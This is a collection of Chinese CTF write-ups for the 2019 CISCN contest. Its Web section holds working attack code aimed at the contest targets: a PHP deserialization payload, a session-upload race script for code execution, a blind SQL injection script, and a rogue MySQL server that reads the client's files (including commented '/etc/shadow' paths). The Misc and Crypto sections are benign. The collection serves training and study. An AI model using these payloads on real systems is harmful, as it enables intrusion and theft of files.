# 2019全国大学生信息安全大赛
本题已开通评论，欢迎在页面最下方留言吐槽。<img src="https://cloud.panjunwen.com/alu/呲牙.png" alt="呲牙.png" class="vemoticon-img">
## 题目类型：
|类型|年份|难度|
|:---:|:---:|:---:|
|官方赛事题|2019|中|

# 网上公开WP:
+ https://www.zhaoj.in/read-5417.html
+ https://xz.aliyun.com/t/4906
+ https://xz.aliyun.com/t/4904
+ https://www.52pojie.cn/thread-936377-1-1.html
+ http://12end.xyz/essay1/
+ https://impakho.com/post/ciscn-2019-online-writeup

# 题目下载：
+ 链接: https://pan.baidu.com/s/1Oz3GjZ7oSdjiFHbz29huMA 提取码: x81y

# 本站备份WP：
**感谢作者：Glzjin、wu1a、warden、lizhirui、12end、七月火**

## Web
**作者：Glzjin、七月火**
### JustSoso
#### 解法一
----------

![](https://www.zhaoj.in/wp-content/uploads/2019/04/1555771284bf45fb5306dbce9cc5a2b51b7e28f239-1024x669.png)

题目

知识点：任意文件读取，PHP 反序列化

步骤：

1、打开靶机，发现是这样一个页面。

![](https://www.zhaoj.in/wp-content/uploads/2019/04/15557714443b02362bcd5bf220079e6bcee5867207-1024x164.png)

2、来看看源码。给了参数和提示，让获取 hint.php 的源码。

![](https://www.zhaoj.in/wp-content/uploads/2019/04/15557714635bd0ceb0416ec9f0b90e749bda0a6c5c-1024x163.png)

3、那么就来获取源码看看吧，访问 `/?file=php://filter/read=convert.base64-encode/resource=hint.php`

![](https://www.zhaoj.in/wp-content/uploads/2019/04/155577166239442308dcf360add6d0101db67a7a51-1024x76.png)

4、BASE64 解码一下，得到 hint.php 的源码。

```
    <?php
    class Handle{
        private $handle;
        public function __wakeup(){
    		foreach(get_object_vars($this) as $k => $v) {
                $this->$k = null;
            }
            echo "Waking up\n";
        }
    	public function __construct($handle) {
            $this->handle = $handle;
        }
    	public function __destruct(){
    		$this->handle->getFlag();
    	}
    }

    class Flag{
        public $file;
        public $token;
        public $token_flag;

        function __construct($file){
    		$this->file = $file;
    		$this->token_flag = $this->token = md5(rand(1,10000));
        }

    	public function getFlag(){
    		$this->token_flag = md5(rand(1,10000));
            if($this->token === $this->token_flag)
    		{
    			if(isset($this->file)){
    				echo @highlight_file($this->file,true);
                }
            }
        }
    }
    ?>
```

5、重复上面的 3~4 步，获取 index.php 的源码。
```
    <html>
    <?php
    error_reporting(0);
    $file = $_GET["file"];
    $payload = $_GET["payload"];
    if(!isset($file)){
    	echo 'Missing parameter'.'<br>';
    }
    if(preg_match("/flag/",$file)){
    	die('hack attacked!!!');
    }
    @include($file);
    if(isset($payload)){
        $url = parse_url($_SERVER['REQUEST_URI']);
        parse_str($url['query'],$query);
        foreach($query as $value){
            if (preg_match("/flag/",$value)) {
        	    die('stop hacking!');
        	    exit();
            }
        }
        $payload = unserialize($payload);
    }else{
       echo "Missing parameters";
    }
    ?>
    <!--Please test index.php?file=xxx.php -->
    <!--Please get the source of hint.php-->
    </html>
```
6、来审计一下源码。

index.php 有 file 和 payload 两个参数，先 include 了 file 所指向的文件，再经过一系列的检测之后 反序列化 payload。

然后 hint.php 有两个类 Handle 和 Flag。 对于 Handle 类，它的魔术方法 Weakup 会清空其自身的成员变量，将其都置为 null。而其析构函数则会调用自身成员变量 handle 的 getFlag 方法。而 Flag 类就有这个 getFlag 方法了，其中会随机一个 md5(1~10000随机数) 的 flag_token，和自身的 token 做比较，相等就去读文件。看起来我们可以用这里来读 flag.php 文件了。

7、把源码拷到本地，来伪造序列化对象。
```
    <?php
    class Handle{
        private $handle;
        public function __wakeup(){
            foreach(get_object_vars($this) as $k => $v) {
                $this->$k = null;
            }
            echo "Waking up\n";
        }
        public function __construct($handle) {
            $this->handle = $handle;
        }
        public function __destruct(){
            $this->handle->getFlag();
        }
    }

    class Flag{
        public $file;
        public $token;
        public $token_flag;

        function __construct($file){
            $this->file = $file;
            $this->token_flag = $this->token = md5(rand(1,10000));
            $this->token = &$this->token_flag;
        }

        public function getFlag(){
            $this->token_flag = md5(rand(1,10000));
            if($this->token === $this->token_flag)
            {
                if(isset($this->file)){
                    echo @highlight_file($this->file,true);
                }
            }
        }
    }


    $flag = new Flag("flag.php");
    $handle = new Handle($flag);
    echo serialize($handle)."\n";
    ?>
```
这里我们加了一行：

`$this->token = &$this->token_flag;`

这样做主要是为了下面 getFlag 那的比较，因为这样的引用变量和他所指向的变量一比较，当然相等了。

后面三行就是要求去读 flag.php 文件，然后序列化对象了。

8、运行一下，生成。

![](https://www.zhaoj.in/wp-content/uploads/2019/04/1555773182add9a0c46679f8c4457aed8c56261396-1024x115.png)

9、打上去，注意 Handle 里的 handle 是私有成员变量，所以得特殊处理下，里面的方块那记得换成 %00。还有为了不触发 weak up\[1\]，所以我们得改下 payload,把成员数目改大些。同时为了绕过后面对于 payload 的检测，我们还要再前面加几个 /\[2\]。所以这里就是访问 ///?file=hint.php&payload=O:6:”Handle”:2:{s:14:”%00Handle%00handle”;O:4:”Flag”:3:{s:4:”file”;s:8:”flag.php”;s:5:”token”;s:32:”b77375f945f272a2084c0119c871c13c”;s:10:”token_flag”;R:4;}}

参考资料\[1\]:[https://www.jianshu.com/p/67ef6f662a4d](https://www.jianshu.com/p/67ef6f662a4d)

参考资料\[2\]:[http://pupiles.com/%E8%B0%88%E8%B0%88parse_url.html](http://pupiles.com/%E8%B0%88%E8%B0%88parse_url.html)

10、访问一下。

![](https://www.zhaoj.in/wp-content/uploads/2019/04/155577370459b9c7bfc24ae1c84bdc52405a523660-1024x158.png)

11、Flag 到手~

Flag: flag{d3601d22-3d10-440e-84b5-c9faff815551}

#### 解法二
作者：**12end**  

**包含session文件以RCE**  
这道题默认没有session，我们可以通过伪造固定session,post一个空文件以及恶意的PHP_SESSION_UPLOAD_PROGRES来执行构造的任意代码。
`PHP_SESSION_UPLOAD_PROGRES`是一个常量，他是`php.ini`设置中`session.upload_progress.name`的默认值，`session.upload_progress`是PHP5.4的新特征。下面是我本地php5.4的默认配置：  
![](http://imgs.12end.xyz/essay/essay1/4.png)  

讲一下个别配置的含义：

+ session.upload_progress.cleanup 是否在上传结束清除上传进度信息，默认为on
+ session.upload_progress.enabled 是否开启记录上传进度信息，默认为on
+ session.upload_progress.prefix 存储上传进度信息的变量前缀，默认为upload_progress_
+ session.upload_progress.name POST中代表进度信息的常量名称，默认为PHP_SESSION_UPLOAD_PROGRES如果
+ _POST[session.upload_progress.name]没有被设置, 则不会报告进度

可以看到，session.upload_progress.cleanup默认是开启的，这意味着我们上传文件后，进度信息会被删除，我们也就不能直接包含session文件，这就需要利用条件竞争，趁进度信息还未被删除时包含session文件。

条件竞争
一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计不合理时，将会导致一系列问题的发生。

我们写一个脚本，一个线程不断上传空文件（同时post伪造的恶意进度信息），另一些线程不停地访问session临时文件，总有几次我们会在服务端还没有删除进度信息时访问到session临时文件。

python脚本：
```
import requests
import threading

url='http://127.0.0.1/index.php'
r=requests.session()
headers={
    "Cookie":'PHPSESSID=123'
}
def POST():
    while True:
        file={
            "upload":('','')                                                    #上传无效的空文件
        }
        data={
            "PHP_SESSION_UPLOAD_PROGRESS":'<?php readfile("./flag.php");?>'     #恶意进度信息，readfile将直接输出文件内容
        }
        r.post(url,files=file,headers=headers,data=data)

def READ():
    while True:
        event.wait()
        t=r.get("http://127.0.0.1/index.php?file=../tmp/tmp/sess_123")
        if 'flag' not in t.text:
            print('[+]retry')
        else:
            print(t.text)
            event.clear()
event=threading.Event()
event.set()
threading.Thread(target=POST,args=()).start()
threading.Thread(target=READ,args=()).start()
threading.Thread(target=READ,args=()).start()
threading.Thread(target=READ,args=()).start()
```
RCE拿到flag内容：  
![](http://imgs.12end.xyz/essay/essay1/5.png)  
因为比赛是下发的docker容器，写shell意义不大，但是的确通过这个脚本读到了flag。  
这个方法依赖于php.ini的一些配置选项，以及session目录的信息，不过大多数情况下这些都是默认的，很容易可以猜到
还有更多利用方法，各位师傅们自由发挥。

### 全宇宙最简单的SQL
------------

![](https://www.zhaoj.in/wp-content/uploads/2019/04/155577386858fc1ffaddd7a23668307be4f8670af0-1024x570.png)

题目

知识点：布尔型盲注，Waf Bypass，MySQL 客户端任意文件读取

1、打开靶机。

![](https://www.zhaoj.in/wp-content/uploads/2019/04/1555774013ba8bfa2d9fa1b74cfb3f8a863144b801-1024x252.png)

2、然后测试提交，抓包看看。

[![](https://www.zhaoj.in/wp-content/uploads/2019/04/15557740662198f4f348e88dfd57a99aa013ba1ebe-1024x613.png)](blob:https://www.zhaoj.in/dd989588-efaf-4320-84ea-4cf357ce3315)

3、放到 postman 里试试。

[![](https://www.zhaoj.in/wp-content/uploads/2019/04/1555774294e2b75176469d1773629a98cd14b653d5-1024x675.png)](https://www.zhaoj.in/wp-content/uploads/2019/04/1555774294e2b75176469d1773629a98cd14b653d5.png)

4、不断 fuzz。主要观察到以下几个现象。

*   username 有注入点。
*   过滤了 or。
*   当最终拼接语句无错误时无论结果如何均为 登录失败。
*   当最终语句有错时返回为 数据库操作失败。

5、根据这两个返回，就可以判断其为 布尔型盲注 了。

6、综上，测试 payload 如下。

username = admin’ union select cot(1 and left(database(),1)>’a’);#

当 left(database(),1)>’a’) 也就是条件为真时，1 and left(database(),1)>’a’ 整个表达式大于 0，没有错误爆出。

当条件为假时，1 and left(database(),1)>’a’ 等于 0，有错误爆出。

上面所说有语句正确执行与否时返回不同，就可以这样区分了。

7、从这儿 [http://zzqsmile.top/2018/06/04/python3/2018-06-04-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/](http://zzqsmile.top/2018/06/04/python3/2018-06-04-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/) 找了个小脚本，把我们的 payload 放进去，修改一下返回判断条件。

同时注意 or 被过滤了，所以 information_schema 也传不上去了。这里就得自己猜猜表名了。
```
    #!/usr/bin/env python3
    # -*- coding: utf-8 -*-

    import requests


    def main():
        get_all_databases("http://39.97.167.120:52105/")


    def http_get(url, payload):
        result = requests.post(url, data={'username': 'admin' + payload, 'password': '123456'})
        result.encoding = 'utf-8'
        if result.text.find('数据库操作失败') == -1:
            return True
        else:
            return False


    # 获取数据库
    def get_all_databases(url):
        db_nums_payload = "select count(*) from users"
        db_numbers = half(url, db_nums_payload)
        print("长度为：%d" % db_numbers)


    # 二分法函数
    def half(url, payload):
        low = 0
        high = 126
        # print(standard_html)
        while low <= high:
            mid = (low + high) / 2
            mid_num_payload = "' union select cot(1 and (%s) > %d);#" % (payload, mid)
            # print(mid_num_payload)
            # print(mid_html)
            if http_get(url, mid_num_payload):
                low = mid + 1
            else:
                high = mid - 1
        mid_num = int((low + high + 1) / 2)
        return mid_num


    if __name__ == '__main__':
        main()
```

8、不断 fuzz，当 长度不为 0 时就是找到表了。

[![](https://www.zhaoj.in/wp-content/uploads/2019/04/155577545209ac8a24e2057945a3fd23926819caab-1024x486.png)](https://www.zhaoj.in/wp-content/uploads/2019/04/155577545209ac8a24e2057945a3fd23926819caab.png)

0，没找到或没数据

[![](https://www.zhaoj.in/wp-content/uploads/2019/04/1555775487f4d3e0156c75efb90d18855acddc795b-1024x626.png)](https://www.zhaoj.in/wp-content/uploads/2019/04/1555775487f4d3e0156c75efb90d18855acddc795b.png)

1，找到了

9、找到表名为 user，知道表名，不知道列名，那就改下函数，如下面这样整，给表设别名。
```
    # 获取数据库
    def get_all_databases(url):
        db_nums_payload = "select length(group_concat(a.1)) from (select 1, 2 union select * from user)a"
        db_numbers = half(url, db_nums_payload)
        print("长度为：%d" % db_numbers)

        db_payload = "select group_concat(a.1) from (select 1, 2 union select * from user)a"
        db_name = ""
        for y in range(1, db_numbers + 1):
            db_name_payload = "ascii(substr((" + db_payload + "),%d,1))" % (
                y)
            db_name += chr(half(url, db_name_payload))

        print("值：" + db_name)
```
![](https://www.zhaoj.in/wp-content/uploads/2019/04/15557758642ae55ba830733a953be12d6503b92dd1-1024x392.png)

第一列是用户名。

参看资料：[http://p0desta.com/2018/03/29/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/#1-10-1-%E5%88%AB%E5%90%8D](http://p0desta.com/2018/03/29/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/#1-10-1-%E5%88%AB%E5%90%8D)

10、再来第二列试试。
```
    # 获取数据库
    def get_all_databases(url):
        db_nums_payload = "select length(group_concat(a.2)) from (select 1, 2 union select * from user)a"
        db_numbers = half(url, db_nums_payload)
        print("长度为：%d" % db_numbers)

        db_payload = "select group_concat(a.2) from (select 1, 2 union select * from user)a"
        db_name = ""
        for y in range(1, db_numbers + 1):
            db_name_payload = "ascii(substr((" + db_payload + "),%d,1))" % (
                y)
            db_name += chr(half(url, db_name_payload))

        print("值：" + db_name)
```
第二列就是密码了。

![](https://www.zhaoj.in/wp-content/uploads/2019/04/1555775939b3fb89ba7ca458662560e7d74d261124-1024x413.png)

似乎还提示我们 flag 在 /fll1llag_h3r3。

11、先用这组用户名密码登录看看，看到可以登录成功。

[![](https://www.zhaoj.in/wp-content/uploads/2019/04/1555776020ee459fa67678ae8c83bfe8a7b9f93c6d-1024x346.png)](https://www.zhaoj.in/wp-content/uploads/2019/04/1555776020ee459fa67678ae8c83bfe8a7b9f93c6d.png)

12、很熟悉的页面，祭出我们的祖传恶意 MySQL 服务器吧。改好要读取的文件，在自己的服务器上运行。
```
    #!/usr/bin/env python
    #coding: utf8


    import socket
    import asyncore
    import asynchat
    import struct
    import random
    import logging
    import logging.handlers



    PORT = 3306

    log = logging.getLogger(__name__)

    log.setLevel(logging.DEBUG)
    # tmp_format = logging.handlers.WatchedFileHandler('mysql.log', 'ab')
    tmp_format = logging.StreamHandler()
    tmp_format.setFormatter(logging.Formatter("%(asctime)s:%(levelname)s:%(message)s"))
    log.addHandler(
        tmp_format
    )

    filelist = (
    #    r'c:\boot.ini',
    #    r'c:\windows\win.ini',
    #    r'c:\windows\system32\drivers\etc\hosts',
        '/fll1llag_h3r3',
    #    '/etc/shadow',
    )


    #================================================
    #=======No need to change after this lines=======
    #================================================

    __author__ = 'Gifts'

    def daemonize():
        import os, warnings
        if os.name != 'posix':
            warnings.warn('Cant create daemon on non-posix system')
            return

        if os.fork(): os._exit(0)
        os.setsid()
        if os.fork(): os._exit(0)
        os.umask(0o022)
        null=os.open('/dev/null', os.O_RDWR)
        for i in xrange(3):
            try:
                os.dup2(null, i)
            except OSError as e:
                if e.errno != 9: raise
        os.close(null)


    class LastPacket(Exception):
        pass


    class OutOfOrder(Exception):
        pass


    class mysql_packet(object):
        packet_header = struct.Struct('<Hbb')
        packet_header_long = struct.Struct('<Hbbb')
        def __init__(self, packet_type, payload):
            if isinstance(packet_type, mysql_packet):
                self.packet_num = packet_type.packet_num + 1
            else:
                self.packet_num = packet_type
            self.payload = payload

        def __str__(self):
            payload_len = len(self.payload)
            if payload_len < 65536:
                header = mysql_packet.packet_header.pack(payload_len, 0, self.packet_num)
            else:
                header = mysql_packet.packet_header.pack(payload_len & 0xFFFF, payload_len >> 16, 0, self.packet_num)

            result = "{0}{1}".format(
                header,
                self.payload
            )
            return result

        def __repr__(self):
            return repr(str(self))

        @staticmethod
        def parse(raw_data):
            packet_num = ord(raw_data[0])
            payload = raw_data[1:]

            return mysql_packet(packet_num, payload)


    class http_request_handler(asynchat.async_chat):

        def __init__(self, addr):
            asynchat.async_chat.__init__(self, sock=addr[0])
            self.addr = addr[1]
            self.ibuffer = []
            self.set_terminator(3)
            self.state = 'LEN'
            self.sub_state = 'Auth'
            self.logined = False
            self.push(
                mysql_packet(
                    0,
                    "".join((
                        '\x0a',  # Protocol
                        '5.6.28-0ubuntu0.14.04.1' + '\0',
                        '\x2d\x00\x00\x00\x40\x3f\x59\x26\x4b\x2b\x34\x60\x00\xff\xf7\x08\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x69\x59\x5f\x52\x5f\x63\x55\x60\x64\x53\x52\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00',
                    ))            )
            )

            self.order = 1
            self.states = ['LOGIN', 'CAPS', 'ANY']

        def push(self, data):
            log.debug('Pushed: %r', data)
            data = str(data)
            asynchat.async_chat.push(self, data)

        def collect_incoming_data(self, data):
            log.debug('Data recved: %r', data)
            self.ibuffer.append(data)

        def found_terminator(self):
            data = "".join(self.ibuffer)
            self.ibuffer = []

            if self.state == 'LEN':
                len_bytes = ord(data[0]) + 256*ord(data[1]) + 65536*ord(data[2]) + 1
                if len_bytes < 65536:
                    self.set_terminator(len_bytes)
                    self.state = 'Data'
                else:
                    self.state = 'MoreLength'
            elif self.state == 'MoreLength':
                if data[0] != '\0':
                    self.push(None)
                    self.close_when_done()
                else:
                    self.state = 'Data'
            elif self.state == 'Data':
                packet = mysql_packet.parse(data)
                try:
                    if self.order != packet.packet_num:
                        raise OutOfOrder()
                    else:
                        # Fix ?
                        self.order = packet.packet_num + 2
                    if packet.packet_num == 0:
                        if packet.payload[0] == '\x03':
                            log.info('Query')

                            filename = random.choice(filelist)
                            PACKET = mysql_packet(
                                packet,
                                '\xFB{0}'.format(filename)
                            )
                            self.set_terminator(3)
                            self.state = 'LEN'
                            self.sub_state = 'File'
                            self.push(PACKET)
                        elif packet.payload[0] == '\x1b':
                            log.info('SelectDB')
                            self.push(mysql_packet(
                                packet,
                                '\xfe\x00\x00\x02\x00'
                            ))
                            raise LastPacket()
                        elif packet.payload[0] in '\x02':
                            self.push(mysql_packet(
                                packet, '\0\0\0\x02\0\0\0'
                            ))
                            raise LastPacket()
                        elif packet.payload == '\x00\x01':
                            self.push(None)
                            self.close_when_done()
                        else:
                            raise ValueError()
                    else:
                        if self.sub_state == 'File':
                            log.info('-- result')
                            log.info('Result: %r', data)

                            if len(data) == 1:
                                self.push(
                                    mysql_packet(packet, '\0\0\0\x02\0\0\0')
                                )
                                raise LastPacket()
                            else:
                                self.set_terminator(3)
                                self.state = 'LEN'
                                self.order = packet.packet_num + 1

                        elif self.sub_state == 'Auth':
                            self.push(mysql_packet(
                                packet, '\0\0\0\x02\0\0\0'
                            ))
                            raise LastPacket()
                        else:
                            log.info('-- else')
                            raise ValueError('Unknown packet')
                except LastPacket:
                    log.info('Last packet')
                    self.state = 'LEN'
                    self.sub_state = None
                    self.order = 0
                    self.set_terminator(3)
                except OutOfOrder:
                    log.warning('Out of order')
                    self.push(None)
                    self.close_when_done()
            else:
                log.error('Unknown state')
                self.push('None')
                self.close_when_done()


    class mysql_listener(asyncore.dispatcher):
        def __init__(self, sock=None):
            asyncore.dispatcher.__init__(self, sock)

            if not sock:
                self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
                self.set_reuse_addr()
                try:
                    self.bind(('', PORT))
                except socket.error:
                    exit()

                self.listen(5)

        def handle_accept(self):
            pair = self.accept()

            if pair is not None:
                log.info('Conn from: %r', pair[1])
                tmp = http_request_handler(pair)

    z = mysql_listener()
    # daemonize()
    asyncore.loop()
```

![](https://www.zhaoj.in/wp-content/uploads/2019/04/1555776204798ec202699ea631618b84d62535eb82.png)

13、在页面上填好信息，点提交。

![](https://www.zhaoj.in/wp-content/uploads/2019/04/1555776257d139b1e5f091c62bc0ed59ff230fbc1a-1024x442.png)

![](https://www.zhaoj.in/wp-content/uploads/2019/04/15557762761b082212a9a145f00753596cffccf7db-1024x375.png)

14、到自个儿的服务器上看看，Flag 文件也读到了。

![](https://www.zhaoj.in/wp-content/uploads/2019/04/155577631609c50652ba48ae392598f14151028d77-1024x593.png)

15、Flag 到手~

Flag：flag{3f4abe8b-aa4a-bb48-c2f9f04d045beade}

### love_math
-----------

![](https://www.zhaoj.in/wp-content/uploads/2019/04/15558579726db85c9e174d72d82a8463d185b7f583-1024x694.png)

题目

知识点：命令注入与条件利用

1、打开靶机。发现似乎是一个计算器。

![](https://www.zhaoj.in/wp-content/uploads/2019/04/15558581732d67112cc31fdcf7d331d335d055e1ba-1024x243.png)

2、提交，抓包看看。

[![](https://www.zhaoj.in/wp-content/uploads/2019/04/1555858298d9a89beeb76e8f0a502e64fce392cd3d-1024x576.png)](https://www.zhaoj.in/wp-content/uploads/2019/04/1555858298d9a89beeb76e8f0a502e64fce392cd3d.png)

3、可以看到直接提交给 calc.php 的，那么我们就访问这个文件看看。

![](https://www.zhaoj.in/wp-content/uploads/2019/04/1555858379f1e2e177148d82481d30ff53c5f9e177-1024x520.png)

4、源码出来了。
```
    <?php
    error_reporting(0);
    //听说你很喜欢数学，不知道你是否爱它胜过爱flag
    if(!isset($_GET['c'])){
        show_source(__FILE__);
    }else{
        //例子 c=20-1
        $content = $_GET['c'];
        if (strlen($content) >= 80) {
            die("太长了不会算");
        }
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
        foreach ($blacklist as $blackitem) {
            if (preg_match('/' . $blackitem . '/m', $content)) {
                die("请不要输入奇奇怪怪的字符");
            }
        }
        //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
        $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
        preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);
        foreach ($used_funcs[0] as $func) {
            if (!in_array($func, $whitelist)) {
                die("请不要输入奇奇怪怪的函数");
            }
        }
        //帮你算出答案
        eval('echo '.$content.';');
    }
```
5、审计一下源码。

先判断 c 这个参数有没有，有的话就判断长度，小于 80 字节就继续往下走。然后拦截一大堆符号，再判断参数里的文本段是否在函数白名单内，都在的话，就继续执行。

6、来看看他的函数表吧。

[http://www.w3school.com.cn/php/php\_ref\_math.asp](http://www.w3school.com.cn/php/php_ref_math.asp)

![](https://www.zhaoj.in/wp-content/uploads/2019/04/1555858915550d89add77ffac6d24e85d87df46770-988x1024.png)

这个特别有意思，[base_convert()](http://www.w3school.com.cn/php/func_math_base_convert.asp) 可以任意进制转换，那么我们就可以把十进制数转换为 36 进制数，这样 a~z 我们就都可以用了。

7、来一个试试。

转换工具：[http://www.atool9.com/hexconvert.php](http://www.atool9.com/hexconvert.php)

![](https://www.zhaoj.in/wp-content/uploads/2019/04/1555859131dd2555b0f43c09a6e420f3fa02c54170-1024x609.png)

8、构造 payload 试试。访问 /calc.php?c=base_convert(55490343972,10,36)()

![](https://www.zhaoj.in/wp-content/uploads/2019/04/15558592612922e7b49ec1a01c23ba355990dfe3da-1024x653.png)

9、成了，那继续研究怎么绕过长度限制吧。这里的思路，就是先拿到 \_GET，然后用里面的参数来作为函数的名字（这里要读文件，就是 file\_get_contents 了）和参数（文件路径）了。

10、不断 fuzz，发现如下的 payload 可以。

> /calc.php?abs=flag.php&pow=show\_source&c=$pi=base\_convert(37907361743,10,36)(dechex(1598506324));($$pi){pow}($$pi{abs})

解释一下，相当于先定义一个 pi 变量，值为 base\_convert(37907361743,10,36)(dechex(1598506324)) 的结果，这里两个函数都是白名单里的 可以绕过。而 dexhex 则就是先把 “\_GET” 的十进制表示转换为十六进制表示，然后其作为 base\_convert(37907361743,10,36)() 的参数，而这里 base\_convert(37907361743,10,36)() 就相当于 hex2bin()，把 hex 转换成文本。然后，得到 _GET 以后再后面用 ($$pi){pow}($$pi{abs}) 来调用 pow 参数里存的方法名，abs 参数里存的参数，这里的字段都在白名单，可以正确绕过。

11、打过去。

![](https://www.zhaoj.in/wp-content/uploads/2019/04/155585975362f156fc7466b3e5eb92d5aec6651dd8-1024x470.png)

12、Flag 到手~

Flag：flag{79480116-456e-4a90-86e8-4b4b885354b9}

### RefSpace
通过 php伪协议 可以获得题目环境中的文件结构如下：

>➜  html tree   
.  
├── app  
│   ├── flag.php  
│   ├── index.php  
│   └── Up10aD.php  
├── backup.zip  
├── flag.txt  
├── index.php  
├── robots.txt  
└── upload  
2 directories, 7 files  

源码如下：

![](https://xzfile.aliyuncs.com/media/upload/picture/20190422203449-0501b814-64fb-1.png)

![](https://xzfile.aliyuncs.com/media/upload/picture/20190422203455-08668214-64fb-1.png)

可以看到 index.php 中存在任意文件包含，但是限制了文件名后缀只能是 `.php `，而 `app/Up10aD.php` 文件中存在上传功能，刚好可以配合前面的文件包含进行 getshell 。具体可以参考：`zip`或`phar`协议包含文件 。getshell之后，只在服务器上发现了加密后的`flag.txt`。在 `app/flag.php` 开头添加上如下代码，访问时 `$key` 值随便填。
```
namespace interesting;
function sha1($var) { // 调用类的私有、保护方法
    $class = new \ReflectionClass('interesting\FlagSDK');
    $method = $class->getMethod('getHash');
    $method->setAccessible(true);
    $instance = $class->newInstance();
    return $method->invoke($instance);
}
```
其原理就是通过命名空间，定义一个同名函数 `sha1` ，在代码调用时，会优先调用本命名空间中的同名函数。另外还有一个考点就是通过反射调用类的私有、保护方法，具体百度即可。绕过` sha1 `的比较，我们就能拿到flag了，backup.zip/sdk开发文档.txt 中的 `return "too{young-too-simple}"` 只是个例子，其真正的语句类似 `return openssl_decrypt(file_get_contents(‘flag路径), '加密算法', $key) `。

#### 其他解法:
+ [解法二：作者：zsx](https://xz.aliyun.com/t/4906#toc-10)

## Misc
**作者：wu1a**
### 签到题
打开摄像头后，有三个人被识别有绿圈，就代表成功了，cmd 界面弹出 flag  
![](https://i.loli.net/2019/04/22/5cbde23cee362.png)  
### saleae
一开始作为一个 web 手，完全没有接触过工控的题目，但受到题目名称的启发，搜了一下  
这个东西用什么软件打开，就下载了 Logic 这个软件，然后打开题目  
![](https://i.loli.net/2019/04/22/5cbde29d94eee.png)  
看到有过滤选项 而且只有 0 和 2 频道有波形图，调整过滤规则  
![](https://i.loli.net/2019/04/22/5cbde29d927c4.png)  
得到了  
![](https://i.loli.net/2019/04/22/5cbde29d73fd1.png)  
导出后 然后编辑一下就是 flag  
![](https://i.loli.net/2019/04/22/5cbde29daa3ab.png)  

### 24c
打开给的 24c.logicdata 文件，得到：  
![](https://i.loli.net/2019/04/22/5cbde36b54dd3.png)  
选择 i2c 过滤规则直接出现了 flag 字样  
![](https://i.loli.net/2019/04/22/5cbde378e2764.png)  
直接就去提交了这个分离出来的 flag 然后一直报错，一度怀疑题目错了。直到看到有一段  
有读写规则的转换，才知道自己不清楚这些 flag 字段是怎么拼接的。  
因为对工控不是很熟悉，百度了一下 24C 芯片的数据读写规则如下，8bitdata 接上 1bitack  
我们导出一下获得的数据  
![](https://i.loli.net/2019/04/22/5cbde38008591.png)  
我们得到的三个字段分别为 f163bdf4e},flag{c4649e10-e9b5-4d90-a883-41c,ac  
现在根据规则对这三段进行拼接  
再导出写入的地址顺序表  
![](https://i.loli.net/2019/04/22/5cbde386dafaf.png)  
了解一下 24c 元件的工作原理后，再通过上表确认了 ac 并不是写在最后 flag 那一段后面的，  
而是插在 flag{c4649e10-e9b5-4d90-a883-41c 中的。  
![](https://i.loli.net/2019/04/22/5cbde38e44893.png)  
![](https://i.loli.net/2019/04/22/5cbde39874953.png)  
![](https://i.loli.net/2019/04/22/5cbde39f74244.png)  
这样就得到了拼接的顺序，得到了正确的 flag
### badusb
直接先打开读文件：  
![](https://i.loli.net/2019/04/22/5cbde40537105.png)  
直接调整规则进行分析，并查看数据分析结果，最终发现只在如下图所示的规则下找到了flag 字段  
![](https://i.loli.net/2019/04/22/5cbde40a93273.png)  
在最后一段数据处发现了 flag  
![](https://i.loli.net/2019/04/22/5cbde41182d54.png)  
导出编辑和昨天的第一题工控一样  
![](https://i.loli.net/2019/04/22/5cbde4185ca4d.png)  
拼接后就得到了最后的 flag  

## Crypto
**作者：wu1a、匿名**
### puzzles
**作者：匿名**
###### Question0
这题就是计算一个四元一次方程组，使用Python里的numpy模块进行求解。
![](https://0d077ef9e74d8.cdn.sohucs.com/ron3dDP_png)  

得到结果[4006. 3053. 2503. 2560.]

整理一下得到`fa6bed9c7a00`

##### Question1
`question1`思考了一会，尝试从`26364809`开始搜素数，发现`26364809`是第`2`个素数，`26366033`是第`76`个，`26366621`是第`113`个。成一个公差为`37`的等差数列。所以`part1`是第`39`个素数，即`26365399`。  
`part1=1924dd7`
##### Question2、3、4
第2 3 4题在网上都可以搜到类似的题目

![](https://0d077ef9e74d8.cdn.sohucs.com/ron3dJ4_gif)  
第一就是简单的求极限和积分。
`part2=(1+91+7+1)*77=7700`
转换成flag格式 `part2=1e14`

第三题是一道物理题目  
![](https://0d077ef9e74d8.cdn.sohucs.com/ron3dLG_gif)->![](https://0d077ef9e74d8.cdn.sohucs.com/ron3dLE_gif)->![](https://0d077ef9e74d8.cdn.sohucs.com/ron3dVn_gif)  
代入数据，最后得到结果`part3=18640`  
转换成flag格式 `part3=48d0`

第四题考的是三重积分  
![https://s2.ax1x.com/2019/04/22/Ekv7fs.gif](https://pic.superbed.cn/item/5cbdad483a213b0417aba5c2)  
令`x=rcosa,y=rsina`。可以将上式转化为：  
![](https://s2.ax1x.com/2019/04/22/Ekvbpn.gif)  
这样就将三重积分转化成了三次定积分。并结合等式左边的式子得出结果。`part4=40320`
转化成flag格式 `part4=9d80`

最后拼接在一起得到flag

### Part_des
